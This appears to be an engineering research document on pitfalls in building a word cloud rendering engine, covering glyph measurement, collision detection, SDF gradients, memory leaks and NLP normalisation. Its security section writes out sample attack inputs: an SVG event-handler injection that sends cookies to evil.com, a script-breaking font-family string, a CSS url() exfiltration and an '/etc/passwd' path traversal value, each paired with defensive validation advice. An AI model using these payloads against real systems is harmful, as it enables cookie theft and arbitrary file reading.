# Domain Pitfalls: Word Cloud Engine

**Domain:** SDF-based word cloud rendering engine (Node.js, TypeScript, Canvas API)
**Researched:** 2026-04-06
**Confidence:** HIGH (majority of findings verified against official issue trackers, academic literature, and canonical implementations)

---

## Critical Pitfalls

Mistakes that cause rewrites, correctness failures, or production outages.

---

### Pitfall C-1: node-canvas measureText Returns Wrong Bounding Boxes

**What goes wrong:** `ctx.measureText()` in node-canvas returns `actualBoundingBoxLeft` and `actualBoundingBoxRight` as `0` and `width` respectively — falling back to a simplified estimate rather than the true glyph ink bounds. This means collision rectangles are computed from a coarser bounding box than the actual rendered pixels. Italic fonts, script typefaces, and glyphs with wide sidebearings (e.g., "W", "AV" kerning pairs) overflow their reported bounds, causing real overlaps that the bitmap check never catches.

**Why it happens:** node-canvas's `measureText` diverges from browser implementations by 2.5–4px and ignores font selectors beyond `font-size` and `font-family`. The upstream issue (Automattic/node-canvas #1703, #331) has been open for years.

**Consequences:** Words visually overlap in the final render despite passing the collision check. The quality promise ("zero overlap") is broken at the typography layer before the geometry layer even fires.

**Prevention:**
- Do not rely on `measureText` for AABB construction. After rasterizing each word glyph to a scratch canvas, scan the pixel rows/columns to find the actual ink bounding box (first and last non-transparent pixel on each axis).
- Use the pixel-scan bounding box as the collision rectangle — not the typographic advance width.
- Add a unit test that measures a known italic word ("f", "j") and asserts the reported bounding box matches a hand-computed reference within 1px.

**Detection warning signs:**
- Words with long descenders or ascenders look clipped or overlapping in CI golden-image diff tests.
- The bounding box for "j" is the same width as the bounding box for "i".

**Phase mapping:** Address in Phase — NLP/Renderer foundation (before any collision logic is written, this contract must be established).

---

### Pitfall C-2: Spiral Search Infinite Loop on Concave Silhouettes

**What goes wrong:** The Archimedean spiral search `r(theta) = a + b*theta` expands outward from a seed point. For a concave silhouette (e.g., a star, a skull, a crescent), the seed point placed at the mask's centroid may be outside the mask or surrounded by thin protrusions. The spiral can exhaust all candidates before finding a valid interior position — or loop forever if the termination condition is "word placed OR spiral exceeded `r_max`" and `r_max` is not bounded.

**Why it happens:** Spiral search assumes convexity: a word that does not fit at radius `r` will fit at radius `r + dr`. This is false for concave shapes. The MAT (Medial Axis Transform) identifies structural necks and cavities, but if MAT seed selection is not integrated into the spiral origin selection, the spiral starts in the wrong place.

**Consequences:** BullMQ job hangs. Worker thread never returns. After 500ms the parent's timeout wrapper should kill the job, but the hanging promise can leak the Canvas context and memory for that job's lifespan.

**Prevention:**
- Set a hard spiral iteration limit: `MAX_SPIRAL_STEPS = 10_000`. If limit is hit, skip the word (do not block).
- Use MAT to derive multiple spiral origins (one per medial branch), not just the image centroid. For each word, try all origins and take the first successful placement.
- Detect concave shapes during SDF generation and switch from single-origin to multi-centric placement (documented in Blueprint Teil III, §3.3).
- Add an async timeout wrapper around the entire word placement loop: `Promise.race([placeWord(), timeout(450)])`.

**Detection warning signs:**
- Job completion time grows linearly with word count rather than `O(n log n)`.
- A specific test fixture (star-shaped mask, 100 words) never completes.

**Phase mapping:** Geometry/Optimizer phase. Must be validated before any production silhouette is used.

---

### Pitfall C-3: Rotated Text Collision False Negatives

**What goes wrong:** At rotation angles that are not multiples of 90 degrees, the AABB collision rectangle is the bounding box of the *rotated* rectangle — which is significantly larger than the word itself. Two words at 45 degrees each will show AABB overlap when the actual glyphs have a gap between them. The bitmap check must operate on the rotated pixel mask, not the axis-aligned bounding box.

The second form of this bug is the opposite: at slight rotations (e.g., 15 degrees), the rotated AABB underestimates the true ink area if the rotation is not applied to the sprite before pixel-scanning. Words appear non-overlapping in the AABB check but overlap in the final render.

**Why it happens:** The canonical d3-cloud implementation acknowledges this: "the current collision algorithm does not take rotation into account and only checks if the outer areas of two words collide." This is a known limitation carried into many derivative implementations.

**Consequences:** Visual overlaps in the rendered output whenever rotation > 0 degrees. This is a correctness bug that is hard to catch without golden image tests at non-zero rotation angles.

**Prevention:**
- Generate the word sprite bitmap *after* applying rotation. The sprite's pixel data represents the rotated glyph.
- Store each placed word's rotated sprite in the global composite bitmap, not its AABB.
- For the AABB pre-filter stage, use the rotated bounding box (which is wider than the unrotated box) as a conservative approximation — false positives in AABB are acceptable, false negatives are not.
- Write a golden-image regression test: place two words at 45 degrees each and assert zero pixel overlap in the output.

**Detection warning signs:**
- Output images show overlapping words only when rotation is enabled.
- Tests pass at 0 degrees rotation but fail at 45 degrees.

**Phase mapping:** Collision detection phase. Rotation must be a first-class parameter in the bitmap collision system from the start, not retrofitted.

---

### Pitfall C-4: node-canvas / skia-canvas Memory Leak in Long-Running Workers

**What goes wrong:** Two confirmed production memory leaks in the Canvas ecosystem:

1. **node-canvas font churn**: Calling `deregisterAllFonts()` followed by `registerFont()` in a loop causes RSS to grow unbounded. On macOS, 2,500 iterations reaches 4 GB. On Linux the growth is slower but present. The root cause: every `deregisterAllFonts()` call triggers a re-scan of system fonts on the next `registerFont()`, which accumulates references.

2. **skia-canvas async leak**: In versions prior to 1.0.2, any async export operation (`.toBuffer('png')`, `.saveAs()`) causes a steady memory leak regardless of GPU settings. Sync operations with GPU rendering do not leak.

**Consequences:** BullMQ workers are long-running Node.js processes (PM2 restarts on crash, not on slow leaks). A rendering worker processing 1,000 requests/hour will exhaust memory within hours of deployment.

**Prevention:**
- Register all custom fonts once at worker startup — never inside the per-request render loop.
- Use a module-level font registry: `const registeredFonts = new Set<string>()`. Only call `registerFont()` for fonts not already in the set.
- For skia-canvas: prefer the sync API path for PNG/SVG output within worker threads. If async is needed, verify the installed version is >= 1.0.2.
- Add a `process.memoryUsage()` health check to `/health/internal` that alerts if RSS exceeds 500 MB.
- Consider spawning a fresh worker process every N renders as a defensive measure (PM2 `max_memory_restart` option).

**Detection warning signs:**
- Worker RSS grows monotonically with no plateau after a GC cycle.
- Memory usage spikes exactly when a new font is first used, not when the canvas is large.

**Phase mapping:** Renderer phase and production-hardening phase. Font registration strategy must be locked in before any multi-tenant load testing.

---

### Pitfall C-5: SDF Gradient Instability at Shape Boundary

**What goes wrong:** The SDF gradient `nabla SDF(x) = (x - nearest_boundary_point) / |x - nearest_boundary_point|` is unit-magnitude everywhere except at the exact boundary, where it is discontinuous (the nearest boundary point transitions between two segments). In discrete pixel grids, the zero-crossing band is 1–2 pixels wide. Words placed near this band get a gradient vector that oscillates between pointing inward and pointing outward depending on sub-pixel position, causing the force-directed refinement step to oscillate rather than converge.

A secondary issue: the Euclidean Distance Transform (EDT) used to compute the SDF has a known raster-scan propagation error — the "tiled front wave" artifact — where distance values near diagonal boundaries are systematically over-estimated by up to `sqrt(2) - 1 ≈ 0.41` pixels.

**Why it happens:** Discrete EDT implementations propagate from axis-aligned neighbors first, then diagonals, introducing an asymmetric error. The SDF's gradient is derived numerically (finite differences), which amplifies this error at the boundary.

**Consequences:** Words that should pack tightly against the silhouette edge instead hover 1–3 pixels away from it, reducing fill density. In worst cases, the force refinement loop oscillates and the word never settles.

**Prevention:**
- Use the Meijster/Felzenszwalb algorithm for EDT (provably exact, O(n)) rather than the raster-scan approximation. Both have TypeScript-friendly implementations.
- Add a one-pixel erosion to the SDF after generation: shrink the usable interior by 1px to push the gradient instability band outside the placement zone.
- In the force refinement loop, clamp the gradient force to zero when `|SDF(x)| < 2.0` (the boundary dead zone). Only apply gradient forces when clearly inside the shape.
- Test: place 200 words in a circle mask and assert that the distance between each word's edge and the circle boundary is less than 3px.

**Detection warning signs:**
- Force refinement runs the full iteration budget without converging.
- Words in the output have a visible "moat" gap between them and the silhouette outline.

**Phase mapping:** Geometry/SDF phase (foundational). The EDT algorithm choice is a day-one decision.

---

## Moderate Pitfalls

Mistakes that degrade quality or require localized rewrites.

---

### Pitfall M-1: Zipf Normalization Breaks on Small Corpora

**What goes wrong:** The logarithmic Zipf normalization `font_size = log(1 + frequency) / log(1 + max_frequency) * (max_size - min_size) + min_size` produces visually flat outputs when the corpus is small (fewer than ~50 unique words). With only 10 words, `log(1 + 1) / log(1 + 8)` gives a ratio of 0.31, meaning the least-frequent word is rendered at 31% of the maximum font size — far too large relative to the dominant term.

Additionally, TF-IDF-AP scores collapse to near-identical values when the document contains only one sentence (all words appear once, IDF terms vanish).

**Why it happens:** Zipf's law is a statistical property of large natural language corpora. It does not hold for texts shorter than a paragraph. Small corpora have poorly estimated low-frequency word weights (the standard Zipf deviation problem).

**Prevention:**
- Define a minimum corpus size threshold (recommended: 20 unique words). Below this threshold, use linear normalization and warn in logs.
- Apply a `min_font_ratio` floor: the smallest word must be at most 25% of the largest word by default, configurable per request.
- Add test cases: single-word input (must not divide by zero), all-same-frequency input (must not produce uniform font sizes via division by zero in normalization denominator).
- Guard: `if (maxFrequency === 0 || maxFrequency === minFrequency) return defaultSize`.

**Detection warning signs:**
- All words in the output appear at nearly the same font size.
- Division-by-zero or NaN in font size calculation (shows as 0px words that are invisible).

**Phase mapping:** NLP phase. Zero-division guard is a day-one requirement before any rendering.

---

### Pitfall M-2: Language-Blind Stopword Removal Corrupts Non-English Input

**What goes wrong:** The `natural` library's default stopword list is English-only. The `compromise` library is English-only by design (documented as a deliberate scope limitation). If a Shopify merchant's product review text is in German, French, or Spanish, the engine will:
- Keep common German stopwords ("und", "die", "der", "das") as high-frequency "important" words
- Remove legitimate German content words that happen to coincide with English stopwords (e.g., "will" in German means "wants")
- Produce a word cloud dominated by grammatical noise

**Why it happens:** AeroCloud's NLP pipeline uses `natural` and `compromise` without a language detection step. The blueprint assumes English input without stating it explicitly.

**Prevention:**
- Integrate `franc` for language detection before stopword removal. `franc` supports 300+ languages and is lightweight (no ML model required).
- Use the `stopword` npm package which provides per-language stopword lists as ES module imports.
- Pipeline: detect language → load language-specific stopword list → remove → TF-IDF → normalize.
- If language confidence from `franc` is below 0.8 (ambiguous), fall back to the union of English + detected-language stopwords.
- Expose a `language` parameter in the API so callers can override auto-detection.

**Detection warning signs:**
- German/French text word clouds are dominated by two-letter words.
- Test with "Das ist ein guter Tag" — if "ist" and "ein" appear in output, stopword removal is language-blind.

**Phase mapping:** NLP phase. Language detection must precede stopword removal in pipeline design.

---

### Pitfall M-3: O(n²) Fallback When Quadtree Degenerates

**What goes wrong:** A quadtree degenerates to O(n²) when many words cluster at the same position (e.g., all words initially placed at the center during the spiral search initialization phase). Nodes that contain more than `MAX_OBJECTS` items but cannot be subdivided further (because all objects are at the same point) cause the quadtree to stop splitting and perform a linear scan of all objects in that leaf.

Additionally, naive quadtree `retrieve()` implementations have historically been O(n²) in the worst case. The `quadtree-js` library had exactly this bug — a `retrieve()` complexity of O(n²) that was only fixed to O(n) in a recent release (reducing retrieval time on 1M objects from ~160ms to ~5ms).

**Prevention:**
- Pin `quadtree-js` at a version that includes the O(n) `retrieve()` fix. Verify by checking the changelog.
- Initialize word positions using MAT-derived placement hints (spread across the skeleton), not all at origin.
- Set `MAX_DEPTH = 12` and `MAX_OBJECTS = 8` for the quadtree. Profile with 500 words in CI.
- Add a performance regression test: placing 500 words must complete the spatial index phase in under 100ms.

**Detection warning signs:**
- Word placement time grows as O(n²) rather than O(n log n) as measured in profiling.
- The quadtree root node has one leaf with all 200 words in it.

**Phase mapping:** Geometry/Optimizer phase. Verify quadtree library version before using it in collision detection.

---

### Pitfall M-4: Stemming Over-Aggression Destroys Semantic Signal

**What goes wrong:** Porter Stemmer (used by `natural`) reduces "running", "runner", and "run" to the same stem "run". This is correct for frequency aggregation but produces ugly output: the word cloud shows "run" instead of the highest-frequency variant. More destructively, it conflates semantically different words: "wand" and "wander" collapse to "wand", "universal" and "university" collapse to "univers".

Over-stemming also corrupts proper nouns and brand names (e.g., "Apple" → "appl", "Netflix" → "netflix" is fine but "WordPress" → "wordpress" loses capitalization information needed for display).

**Prevention:**
- Use stemming only for frequency *counting*, not for the display token. Store both the stem (for grouping) and the most-frequent surface form (for rendering).
- Data structure: `Map<stem, { displayForm: string, count: number }>` where `displayForm` is the surface form with the highest individual frequency.
- Disable stemming for tokens that appear in a proper-noun list (compromise's `.match('#ProperNoun')` tagger).
- Add a test: input "running runner runs run" must produce the display token "running" (highest frequency among the stem group).

**Detection warning signs:**
- Output contains words like "univers", "technolog", "optim" (truncated stems).
- Proper names appear in all-lowercase in the rendered output.

**Phase mapping:** NLP phase. Stem-for-counting / surface-form-for-display is a foundational data structure decision.

---

### Pitfall M-5: Force-Directed Refinement Diverges or Oscillates

**What goes wrong:** Force-directed layout uses velocity Verlet integration with a cooling schedule (alpha decay). Two failure modes:

1. **Divergence**: If initial word positions overlap significantly (packing phase left collisions), the repulsion forces at iteration 0 are large, causing words to fly out of the silhouette boundary before the boundary attraction force can correct them. Words end up outside the mask.

2. **Oscillation**: If the velocity decay parameter is too low (< 0.3), the layout oscillates between two nearly-valid states without converging. The alpha cooling reaches zero before positions stabilize.

**Why it happens:** d3-force documents that "less velocity decay may converge on a better solution, but risks numerical instabilities and oscillation." The initial position quality directly determines whether refinement converges.

**Prevention:**
- The packing phase must produce near-zero-overlap results before force refinement starts. Force refinement is a fine-tuner, not a collision resolver. Use a hard constraint: enter force refinement only if bitmap collision check passes at >= 95% of words.
- Clamp force magnitudes per iteration: `|F| = min(|F|, MAX_FORCE)` where `MAX_FORCE = 5.0` pixels/step.
- Add a boundary-containment force: any word whose bounding box crosses the silhouette boundary gets a strong inward force proportional to the distance of the crossing.
- Set `alpha_decay = 0.0228` (d3-force default) and `velocity_decay = 0.4`. Do not tune lower without profiling convergence.
- Exit early if the mean position delta between iterations falls below 0.1px (converged).

**Detection warning signs:**
- Words appear outside the silhouette boundary in the output.
- Refinement always runs the full iteration budget (never early-exits).

**Phase mapping:** Optimizer phase. Initial position quality from the spiral/SDF packing phase is the dependency.

---

## Minor Pitfalls

Technical debt items that cause subtle bugs if unaddressed.

---

### Pitfall Mi-1: Subpixel Positioning Causes Rendering Artifacts

**What goes wrong:** Canvas `fillText(text, x, y)` rounds sub-pixel coordinates to the nearest pixel grid. If word positions are stored as floats and passed directly to `fillText`, adjacent rendering passes produce slight pixel-grid misalignment. The anti-aliasing at word edges then shows different artifacts depending on whether the position was 100.3 vs 100.7 — one renders sharp, the other slightly blurry.

This matters for the final PNG/SVG export quality, especially at medium resolutions (800x600). At 4K output it is invisible; at 300x300 thumbnails it is very visible.

**Prevention:**
- Round final word placement positions to integers before the export render pass: `Math.round(x)`, `Math.round(y)`.
- Keep float precision during the optimization loop (force refinement needs sub-pixel motion). Snap to integers only at the final `ctx.fillText()` call.
- The bitmap collision mask must be built from the integer-snapped positions, not the float positions.

**Phase mapping:** Renderer phase. One-line fix but must be documented as a constraint.

---

### Pitfall Mi-2: Font Hinting Differences Between Development and Production

**What goes wrong:** Font hinting renders glyphs differently on different platforms. A word cloud generated on macOS (developer machine) may show slightly different glyph widths than one generated on the Linux production server (VPS). This is not a bug in the code — it is platform-specific font rendering — but it means golden-image tests that pass locally may fail in CI on the server.

Additionally, web fonts loaded from a URL (e.g., Google Fonts) may differ from locally-installed fonts with the same name. If the production server falls back to a system serif font when the custom font is unavailable, word sizes change and words may overlap.

**Prevention:**
- Bundle all required fonts in the repository under `assets/fonts/`. Do not depend on system font availability in production.
- Create golden-image test fixtures on the Linux CI environment, not macOS.
- Add a startup check: verify all fonts listed in the default font palette are resolvable before accepting requests.
- Log the resolved font filename for every render request so discrepancies are diagnosable.

**Phase mapping:** Renderer phase and production-hardening phase.

---

### Pitfall Mi-3: SVG Export XSS via User-Supplied Colors and Font Names

**What goes wrong:** The SVG export renders words as `<text>` elements with `fill` and `font-family` attributes. If those attribute values come from user input (e.g., the API accepts a `colors[]` array or `fontFamily` string) and are written directly into the SVG without sanitization, an attacker can inject:
- `fill="red" onclick="fetch('https://evil.com?c='+document.cookie)"` — event handler injection
- `font-family="serif; } </style><script>alert(1)</script>"` — style-breaking injection
- `font-family="url(https://attacker.com/exfil)"` — SSRF via CSS font loading

Two confirmed 2024 DOMPurify bypasses (CVE-2024-45801, CVE-2024-47875) show that DOMPurify alone is not sufficient for SVG attribute sanitization when namespace tricks are used.

**Prevention:**
- Validate `colors[]` values against a strict CSS color regex: `^#[0-9a-fA-F]{3,8}$` or `^rgb\(\d+,\s*\d+,\s*\d+\)$`. Reject anything else.
- Validate `fontFamily` against an allow-list of registered font names in the engine's font registry. Never pass raw user input as a CSS font-family value.
- For SVG output, use a template with pre-escaped attribute slots — do not use string concatenation to build SVG markup.
- Apply a server-side SVG sanitizer (e.g., `h5p-svg-sanitizer`) as a final pass before returning the SVG to the caller.
- Keep DOMPurify updated to >= 3.1.3 (patches CVE-2024-45801).

**Detection warning signs:**
- The API accepts `fontFamily: "serif</style><script>alert(1)</script>"` without returning a 400.
- SVG output contains unescaped `<` or `>` characters in attribute values.

**Phase mapping:** Security phase (must be addressed before any public API endpoint is exposed). Applies from Phase 1 onward.

---

### Pitfall Mi-4: Path Traversal in Mask Image Upload

**What goes wrong:** If the engine accepts a file path to a mask image (silhouette) rather than requiring base64/binary upload, an attacker can supply `../../../../etc/passwd` or a Windows device name (`CON`, `PRN`) to read arbitrary files. CVE-2025-27210 (Node.js 22.x, patched July 2025) demonstrates that `path.normalize()` does not reliably prevent traversal using Windows device names.

**Prevention:**
- Never accept file paths from external callers. The API must accept image data as a base64-encoded payload or a multipart upload.
- If internal file paths are used (e.g., preset silhouettes), resolve them against a locked base directory using `path.resolve(BASE_DIR, filename)` and assert the result starts with `BASE_DIR`.
- Validate the resolved path before reading: `if (!resolvedPath.startsWith(BASE_DIR)) throw new Error('Path traversal detected')`.
- Add a test: supply `../../../../etc/passwd` as a mask path and assert HTTP 400 is returned.

**Phase mapping:** Security phase. Day-one requirement for any endpoint accepting mask input.

---

### Pitfall Mi-5: DoS via Oversized or Pathological Inputs

**What goes wrong:** The following inputs can cause the engine to hang or OOM without explicit limits:
- Text input with 100,000 words (TF-IDF computation and packing both degrade non-linearly)
- A 4000x4000 mask image (bitmap collision matrix is 16M pixels, 2MB for 1-bit packing)
- A mask image that is entirely white (no valid placement zone — infinite spiral search)
- A word with a font size of 10,000px (larger than the canvas, triggers AABB check to test every position)

**Prevention:**
- Define and enforce hard input limits in the Fastify schema validator:
  - `maxWords: 1000`
  - `maxTextLength: 50_000` characters
  - `maxMaskDimensions: 2000x2000` pixels (reject larger with HTTP 413)
  - `maxFontSize: 500` pixels
- For the "all-white mask" case: after SDF generation, assert that `sum(SDF > 0) >= MIN_INTERIOR_PIXELS` (e.g., 1000 pixels). Reject if the mask has no interior.
- Wrap the entire render pipeline in an async timeout: `Promise.race([render(), timeout(5000)])`. Return HTTP 503 on timeout instead of hanging.

**Phase mapping:** Security and API phase. Limits must be in the Fastify schema from the first public endpoint.

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|---|---|---|
| NLP pipeline implementation | Zipf division-by-zero (M-1), language-blind stopwords (M-2), stem display corruption (M-4) | Corpus size guard + franc language detection + display-form tracking |
| SDF/geometry foundation | EDT boundary artifacts (C-5), EDT algorithm choice | Use Meijster/Felzenszwalb EDT from day one |
| Collision detection | measureText bounding box inaccuracy (C-1), rotated-text false negatives (C-3), quadtree degeneration (M-3) | Pixel-scan AABB, rotated sprites, pinned quadtree version |
| Spiral/packing optimizer | Infinite loop on concave masks (C-2), overflow beyond mask (Mi-5) | MAX_SPIRAL_STEPS + multi-centric origins + interior-pixel assertion |
| Force-directed refinement | Divergence/oscillation (M-5) | Pre-condition on near-zero-overlap input, force magnitude clamping |
| Renderer/export | subpixel snap (Mi-1), font hinting drift (Mi-2), memory leak (C-4) | Integer-snap before fillText, bundle fonts, module-level font registry |
| API/security | SVG XSS (Mi-3), path traversal (Mi-4), DoS (Mi-5) | Allow-list colors/fonts, no file-path params, Fastify schema limits |
| Long-running workers | Canvas memory leak (C-4) | One-time font registration, RSS health check, PM2 max_memory_restart |

---

## Sources

- [How the Word Cloud Generator Works — Jason Davies](https://www.jasondavies.com/wordcloud/about/)
- [d3-cloud GitHub (canonical JS word cloud)](https://github.com/jasondavies/d3-cloud)
- [node-canvas measureText bounding box bug #1703](https://github.com/Automattic/node-canvas/issues/1703)
- [node-canvas measureText diverges from browser #331](https://github.com/Automattic/node-canvas/issues/331)
- [node-canvas severe font memory leak #1974](https://github.com/Automattic/node-canvas/issues/1974)
- [skia-canvas async memory leak #145](https://github.com/samizdatco/skia-canvas/issues/145)
- [skia-canvas npm page (version/threading info)](https://www.npmjs.com/package/skia-canvas)
- [Sub-pixel Distance Transform — Acko.net](https://acko.net/blog/subpixel-distance-transform/)
- [EDT raster-scan propagation error — Image.sc Forum](https://forum.image.sc/t/bug-in-exact-euclidean-distance-transform-3d/79440)
- [d3-force simulation — convergence and stability](https://d3js.org/d3-force/simulation)
- [D3-Force Directed Layout Optimization — DZone](https://dzone.com/articles/d3-force-directed-graph-layout-optimization-in-neb)
- [quadtree-js O(n) retrieve fix](https://github.com/timohausmann/quadtree-js)
- [CVE-2024-45801 DOMPurify XSS Bypass](https://www.sentinelone.com/vulnerability-database/cve-2024-45801/)
- [CVE-2024-47875 DOMPurify Nested Elements XSS](https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8184974)
- [DOMPurify SVG namespace bypass (December 2024)](https://blog.slonser.info/posts/dompurify-dirty-namespace-bypass/)
- [CVE-2025-27210 Node.js Windows Path Traversal](https://zeropath.com/blog/cve-2025-27210-nodejs-path-traversal-windows)
- [Zipf's law and small corpus deviation — PLOS ONE](https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0147073)
- [compromise NLP — English-only scope](https://github.com/spencermountain/compromise)
- [Automatic Multilingual Stopwords from Small Corpora](https://www.mdpi.com/2079-9292/10/17/2169)
- [Blueprint: AeroCloud-Blueprint.md, Teil III §3.3 (Multi-Centric Wordle)](raw/sources/AeroCloud-Blueprint.md)
